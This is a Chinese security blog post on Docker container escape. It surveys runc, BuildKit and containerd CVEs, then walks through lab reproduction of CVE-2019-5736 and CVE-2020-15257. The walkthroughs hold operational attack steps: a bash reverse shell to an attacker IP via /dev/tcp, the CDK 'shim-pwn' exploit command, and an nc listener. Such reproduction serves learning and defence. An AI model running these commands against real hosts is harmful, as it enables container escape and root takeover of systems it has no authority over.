<h3 id="一、容器组件漏洞"><a href="#一、容器组件漏洞" class="headerlink" title="一、容器组件漏洞"></a><strong>一、容器组件漏洞</strong></h3><h4 id="1-runc-相关漏洞"><a href="#1-runc-相关漏洞" class="headerlink" title="1. runc 相关漏洞"></a><strong>1. runc 相关漏洞</strong></h4><ul>
<li><p><strong>CVE-2024-21626（Leaky Vessels）</strong>  </p>
<ul>
<li><strong>影响版本</strong>：runc 1.0.0-rc93 至 1.1.11  </li>
<li><strong>原理</strong>：由于文件描述符泄漏，攻击者可通过构造恶意容器镜像或利用 <code>runc exec</code> 命令，使容器进程访问宿主机文件系统，覆盖宿主机二进制文件实现逃逸。  </li>
<li><strong>利用场景</strong>：攻击者通过挂载 <code>/proc/self/fd/</code> 目录，绕过隔离访问宿主机根目录。</li>
</ul>
</li>
<li><p><strong>CVE-2019-5736（runc 容器逃逸）</strong>  </p>
<ul>
<li><strong>影响版本</strong>：runc ≤1.0-rc6，Docker ≤18.09.2  </li>
<li><strong>原理</strong>：通过覆盖宿主机上的 <code>runc</code> 二进制文件，当管理员执行 <code>docker exec</code> 时触发恶意代码执行。  </li>
<li><strong>利用条件</strong>：需容器内用户权限，且宿主机管理员执行容器操作。</li>
</ul>
</li>
<li><p><strong>CVE-2019-16884</strong>  </p>
<ul>
<li><strong>影响版本</strong>：runc ≤1.0.0-rc8  </li>
<li><strong>原理</strong>：容器内进程可通过特定操作突破命名空间隔离，访问宿主机资源。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-BuildKit-相关漏洞（Leaky-Vessels-系列）"><a href="#2-BuildKit-相关漏洞（Leaky-Vessels-系列）" class="headerlink" title="2. BuildKit 相关漏洞（Leaky Vessels 系列）"></a><strong>2. BuildKit 相关漏洞（Leaky Vessels 系列）</strong></h4><ul>
<li><strong>CVE-2024-23651</strong>  <ul>
<li><strong>CVSS 8.7</strong>：BuildKit ≤0.12.4 中，恶意构建步骤通过共享缓存挂载引发竞争条件，访问宿主机文件。</li>
</ul>
</li>
<li><strong>CVE-2024-23652</strong>  <ul>
<li><strong>CVSS 10.0</strong>：恶意 Dockerfile 利用 <code>RUN --mount</code> 参数删除宿主机文件。</li>
</ul>
</li>
<li><strong>CVE-2024-23653</strong>  <ul>
<li><strong>CVSS 9.8</strong>：BuildKit API 权限检查不严，允许以提升的权限运行容器。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-containerd-相关漏洞"><a href="#3-containerd-相关漏洞" class="headerlink" title="3. containerd 相关漏洞"></a><strong>3. containerd 相关漏洞</strong></h4><ul>
<li><strong>CVE-2020-15257</strong>  <ul>
<li><strong>影响版本</strong>：containerd &lt;1.3.9 或 1.4.0~1.4.2  </li>
<li><strong>原理</strong>：当容器以 <code>--net=host</code> 共享宿主机网络命名空间时，攻击者通过 <code>containerd-shim</code> API 控制宿主机容器。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="二、CVE-2019-5736-漏洞复现流程"><a href="#二、CVE-2019-5736-漏洞复现流程" class="headerlink" title="二、CVE-2019-5736 漏洞复现流程"></a>二、CVE-2019-5736 漏洞复现流程</h3><p>以下是 <strong>CVE-2019-5736</strong> 漏洞的利用流程详解，结合漏洞原理及复现步骤：</p>
<hr>
<h4 id="1-漏洞原理-2"><a href="#1-漏洞原理-2" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h4><p>该漏洞源于容器运行时组件 <strong>runc</strong>（Docker、containerd 等底层依赖），攻击者可通过容器内进程访问宿主机的 <code>/proc/[runc-PID]/exe</code> 文件描述符，覆盖宿主机上的 <code>runc</code> 二进制文件。当管理员执行 <code>docker exec</code> 或容器启动时，触发恶意代码执行，从而以宿主机 root 权限逃逸容器环境。</p>
<p><strong>核心条件</strong>：</p>
<ul>
<li><strong>影响版本</strong>：Docker ≤18.09.2 或 runc ≤1.0-rc6。</li>
<li><strong>权限要求</strong>：容器内需具备 root 权限。</li>
</ul>
<hr>
<h4 id="2-漏洞利用流程"><a href="#2-漏洞利用流程" class="headerlink" title="2. 漏洞利用流程"></a><strong>2. 漏洞利用流程</strong></h4><h5 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="(1) 环境准备"></a><strong>(1) 环境准备</strong></h5><ol>
<li><p><strong>搭建漏洞环境</strong>：</p>
<ul>
<li>安装未修复的 Docker 版本（如 18.03.1）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker-ce-18.03.1.ce</span><br></pre></td></tr></table></figure></li>
<li>确认 runc 版本 ≤1.0-rc6。</li>
</ul>
</li>
<li><p><strong>启动容器</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name vuln_container ubuntu /bin/bash</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="2-生成-Payload"><a href="#2-生成-Payload" class="headerlink" title="(2) 生成 Payload"></a><strong>(2) 生成 Payload</strong></h5><ol>
<li><strong>下载 PoC 代码</strong>（如 <a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">GitHub&#x2F;Frichetten&#x2F;CVE-2019-5736-PoC</a>）。</li>
<li><strong>修改 Payload</strong>：<ul>
<li>将 PoC 中的命令替换为反弹 Shell 或其他恶意指令（例如 <code>bash -i &gt;&amp; /dev/tcp/攻击机IP/端口 0&gt;&amp;1</code>）。</li>
</ul>
</li>
<li><strong>编译生成可执行文件</strong>（需 Go 环境）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="3-上传-Payload-至容器"><a href="#3-上传-Payload-至容器" class="headerlink" title="(3) 上传 Payload 至容器"></a><strong>(3) 上传 Payload 至容器</strong></h5><ol>
<li><strong>复制 Payload 到容器内</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> main vuln_container:/tmp/</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="4-执行攻击"><a href="#4-执行攻击" class="headerlink" title="(4) 执行攻击"></a><strong>(4) 执行攻击</strong></h5><ol>
<li><p><strong>在容器内运行 Payload</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /tmp/main &amp;&amp; /tmp/main</span><br></pre></td></tr></table></figure>
<ul>
<li>Payload 会持续监听 <code>/proc</code> 目录，等待宿主机执行 <code>docker exec</code>。</li>
</ul>
</li>
<li><p><strong>触发漏洞</strong>：</p>
<ul>
<li>管理员在宿主机执行 <code>docker exec</code> 命令（如进入容器）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it vuln_container /bin/sh</span><br></pre></td></tr></table></figure></li>
<li>此时，容器内的 Payload 会通过 <code>/proc/[runc-PID]/exe</code> 覆盖宿主机 <code>runc</code> 文件。</li>
</ul>
</li>
</ol>
<h5 id="5-获取宿主机权限"><a href="#5-获取宿主机权限" class="headerlink" title="(5) 获取宿主机权限"></a><strong>(5) 获取宿主机权限</strong></h5><ul>
<li><strong>反弹 Shell</strong>：攻击机监听指定端口，获得宿主机 root 权限的 Shell。</li>
<li><strong>任意命令执行</strong>：覆盖后的 <code>runc</code> 会在后续容器操作中执行攻击者预设的命令。</li>
</ul>
<hr>
<h4 id="3-关键步骤解析"><a href="#3-关键步骤解析" class="headerlink" title="3. 关键步骤解析"></a><strong>3. 关键步骤解析</strong></h4><ol>
<li><p><strong>覆盖 runc 文件</strong>：</p>
<ul>
<li>容器内通过 <code>/proc</code> 访问宿主机的 <code>runc</code> 进程文件描述符，以写入恶意代码。</li>
<li>利用 Linux 的 <code>memfd_create</code> 机制绕过文件路径限制。</li>
</ul>
</li>
<li><p><strong>触发机制</strong>：</p>
<ul>
<li><code>docker exec</code> 操作会调用 <code>runc</code> 进入容器命名空间，此时容器内进程可捕获 <code>runc</code> 的 PID。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="三、CVE-2020-15257-漏洞复现流程"><a href="#三、CVE-2020-15257-漏洞复现流程" class="headerlink" title="三、CVE-2020-15257 漏洞复现流程"></a>三、CVE-2020-15257 漏洞复现流程</h3><p>以下是 <strong>CVE-2020-15257</strong> 漏洞的利用流程详解，结合漏洞原理及复现步骤：</p>
<hr>
<h4 id="1-漏洞背景与原理"><a href="#1-漏洞背景与原理" class="headerlink" title="1. 漏洞背景与原理"></a><strong>1. 漏洞背景与原理</strong></h4><ul>
<li><strong>漏洞组件</strong>：Containerd（Docker 的容器运行时组件），通过其子组件 <code>containerd-shim</code> 暴露的抽象 Unix 域套接字（Abstract Unix Domain Socket）实现容器管理。</li>
<li><strong>触发条件</strong>：<ul>
<li>容器以 <strong><code>--net=host</code>（共享宿主机网络命名空间）</strong> 启动。</li>
<li>容器内进程以 <strong>Root 用户（UID 0）</strong> 运行。</li>
<li>Containerd 版本 ≤1.3.9 或 ≤1.4.3。</li>
</ul>
</li>
<li><strong>漏洞本质</strong>：攻击者可通过共享的网络命名空间访问宿主机上的 <code>containerd-shim</code> 套接字，调用其 API 创建新容器或执行命令，实现容器逃逸。</li>
</ul>
<hr>
<h4 id="2-漏洞利用流程-1"><a href="#2-漏洞利用流程-1" class="headerlink" title="2. 漏洞利用流程"></a><strong>2. 漏洞利用流程</strong></h4><h5 id="步骤-1：搭建漏洞环境"><a href="#步骤-1：搭建漏洞环境" class="headerlink" title="步骤 1：搭建漏洞环境"></a><strong>步骤 1：搭建漏洞环境</strong></h5><ol>
<li><strong>安装有漏洞的 Containerd 版本</strong>（如 Docker Engine ≤19.03.6）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce=5:19.03.6~3-0~ubuntu-xenial containerd.io=1.2.4-1</span><br></pre></td></tr></table></figure></li>
<li><strong>以 Host 模式启动容器</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd --net=host --name vulnerable_container ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="步骤-2：检测漏洞存在性"><a href="#步骤-2：检测漏洞存在性" class="headerlink" title="步骤 2：检测漏洞存在性"></a><strong>步骤 2：检测漏洞存在性</strong></h5><ol>
<li><strong>查看抽象 Unix 套接字</strong>（容器内执行）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/net/unix | grep <span class="string">&#x27;containerd-shim&#x27;</span> | grep <span class="string">&#x27;@&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>若输出类似 <code>@/containerd-shim/moby/[哈希]/shim.sock</code>，则存在漏洞。</li>
</ul>
</li>
</ol>
<h5 id="步骤-3：利用漏洞逃逸"><a href="#步骤-3：利用漏洞逃逸" class="headerlink" title="步骤 3：利用漏洞逃逸"></a><strong>步骤 3：利用漏洞逃逸</strong></h5><ol>
<li><p><strong>下载并上传利用工具</strong>（如 CDK）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 CDK（容器渗透工具包）</span></span><br><span class="line">wget https://github.com/Xyntax/CDK/releases/download/0.1.6/cdk_v0.1.6_release.tar.gz</span><br><span class="line">tar -zxvf cdk_v0.1.6_release.tar.gz</span><br><span class="line"><span class="comment"># 将工具复制到容器内</span></span><br><span class="line">docker <span class="built_in">cp</span> cdk_linux_amd64 vulnerable_container:/tmp/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在容器内执行 Exploit</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it vulnerable_container /bin/bash</span><br><span class="line"><span class="comment"># 执行 CDK 反弹 Shell</span></span><br><span class="line">./cdk_linux_amd64 run shim-pwn &lt;攻击机IP&gt; &lt;监听端口&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>攻击机监听端口</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp &lt;监听端口&gt;</span><br></pre></td></tr></table></figure></li>
<li>成功时，攻击机会收到宿主机的 Shell，实现逃逸。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="3-漏洞原理细节"><a href="#3-漏洞原理细节" class="headerlink" title="3. 漏洞原理细节"></a><strong>3. 漏洞原理细节</strong></h4><ul>
<li><strong>抽象套接字暴露</strong>：<code>containerd-shim</code> 通过抽象 Unix 域套接字（以 <code>@</code> 开头）与 Containerd 通信。当容器共享宿主机网络命名空间时，攻击者可扫描 <code>/proc/net/unix</code> 获取套接字路径。</li>
<li><strong>API 滥用</strong>：通过套接字调用 <code>containerd-shim</code> 的 API（如创建新容器、挂载宿主机根目录），绕过隔离机制。</li>
</ul>
<hr>
<h4 id="4-实际影响与案例"><a href="#4-实际影响与案例" class="headerlink" title="4. 实际影响与案例"></a><strong>4. 实际影响与案例</strong></h4><ul>
<li><strong>攻击场景</strong>：攻击者可利用该漏洞在云原生环境中横向移动，控制宿主机及集群内其他容器。</li>
<li><strong>案例</strong>：未修复的 Kubernetes 集群中，恶意容器通过 Host 网络逃逸，窃取敏感数据或部署后门。</li>
</ul>
<hr>
<h3 id="四、总结与对比"><a href="#四、总结与对比" class="headerlink" title="四、总结与对比"></a>四、<strong>总结与对比</strong></h3><ol>
<li><strong>Docker 架构中的角色</strong>：<ul>
<li><strong>BuildKit</strong>：构建镜像，生成符合 OCI 标准的镜像文件。</li>
<li><strong>containerd</strong>：管理镜像和容器生命周期，调用 runc 执行容器。</li>
<li><strong>runc</strong>：实际创建容器进程，实现内核级隔离。</li>
</ul>
</li>
<li><strong>Kubernetes 中的调用链</strong>：<ul>
<li><strong>Kubelet → containerd → runc</strong>：Kubernetes 通过 CRI 接口调用 containerd，containerd 通过 runc 运行容器6。</li>
</ul>
</li>
<li><strong>独立使用场景</strong>：<ul>
<li>仅需 runc：手动创建容器（需准备 rootfs 和配置文件）。</li>
<li>仅需 containerd：轻量级容器管理（无需 Docker 的复杂功能）。</li>
<li>仅需 BuildKit：高效构建镜像（如集成到 CI 工具链）。</li>
</ul>
</li>
</ol>
<table>
<thead>
<tr>
<th align="left"><strong>组件</strong></th>
<th align="left"><strong>定位</strong></th>
<th align="left"><strong>核心功能</strong></th>
<th align="left"><strong>依赖关系</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>runc</strong></td>
<td align="left">底层运行时工具</td>
<td align="left">容器进程创建与资源隔离</td>
<td align="left">独立运行，被 containerd 调用</td>
</tr>
<tr>
<td align="left"><strong>containerd</strong></td>
<td align="left">容器运行时管理器</td>
<td align="left">镜像管理、容器生命周期</td>
<td align="left">依赖 runc 执行容器</td>
</tr>
<tr>
<td align="left"><strong>BuildKit</strong></td>
<td align="left">镜像构建工具</td>
<td align="left">高效构建与缓存管理</td>
<td align="left">可选依赖 containerd&#x2F;runc</td>
</tr>
</tbody></table>
<ul>
<li><strong>runc</strong>：主要风险来自文件描述符泄漏和二进制覆盖（如 CVE-2019-5736 和 CVE-2024-21626）。</li>
<li><strong>BuildKit</strong>：构建阶段的竞态条件、权限缺陷和文件操作漏洞是逃逸核心（如 CVE-2024-23651~23653）。</li>
<li><strong>containerd</strong>：共享网络命名空间导致 API 滥用（如 CVE-2020-15257）。</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Takake</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.takake.com/posts/35958/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.takake.com/posts/35958/')">Docker Escape</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" alt="红十字会"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" alt="LOGO"/></a><div class="post-qr-code-desc">LOGO</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.takake.com/posts/35958/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Docker Escape&amp;url=https://blog.takake.com/posts/35958/&amp;pic=https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Docker-Logo-1024x576.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.takake.com" target="_blank">高木のBlog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>权限提升<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/Docker/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Docker<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>云安全<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/img/default_cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/5304/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">域横向移动工具对比</div></div></a></div><div class="next-post pull-right"><a href="/posts/45333/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Docker-Logo-1024x576.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">k8s云安全</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/45333/" title="k8s云安全"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Docker-Logo-1024x576.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-05-20</div><div class="title">k8s云安全</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://emotion.acs.pw/emotion/Heo-100/%E6%BB%91%E7%A8%BD.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">网络安全、开发、人工智能</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Takake</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/takakie" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/3494356843497618" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">防疫指南：菊花上插葱，新冠去无踪✌️</div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/645fa415e869402.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker-Escape"><span class="toc-number">1.</span> <span class="toc-text">Docker Escape</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E7%A1%AE%E8%AE%A4"><span class="toc-number">1.1.</span> <span class="toc-text">0.容器环境确认</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A3%80%E6%9F%A5-proc-1-cgroup-%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 检查 &#x2F;proc&#x2F;1&#x2F;cgroup 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A3%80%E6%9F%A5-dockerenv-%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 检查 &#x2F;.dockerenv 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A3%80%E6%9F%A5-proc-mounts-%E4%B8%AD%E7%9A%84%E6%8C%82%E8%BD%BD%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. 检查 &#x2F;proc&#x2F;mounts 中的挂载信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%A3%80%E6%9F%A5%E8%BF%9B%E7%A8%8B%E6%95%B0%E9%87%8F"><span class="toc-number">1.1.4.</span> <span class="toc-text">4. 检查进程数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%A3%80%E6%9F%A5%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B1%BB%E5%9E%8B%EF%BC%88systemd-detect-virt%EF%BC%89"><span class="toc-number">1.1.5.</span> <span class="toc-text">5. 检查虚拟化类型（systemd-detect-virt）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%A3%80%E6%9F%A5%E8%AE%BE%E5%A4%87%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.6.</span> <span class="toc-text">6. 检查设备文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%A3%80%E6%9F%A5%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E4%B8%80%E8%87%B4"><span class="toc-number">1.1.7.</span> <span class="toc-text">7. 检查内核版本与宿主机是否一致</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%A3%80%E6%9F%A5%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.1.8.</span> <span class="toc-text">8. 检查环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.1.9.</span> <span class="toc-text">9. 检查网络接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 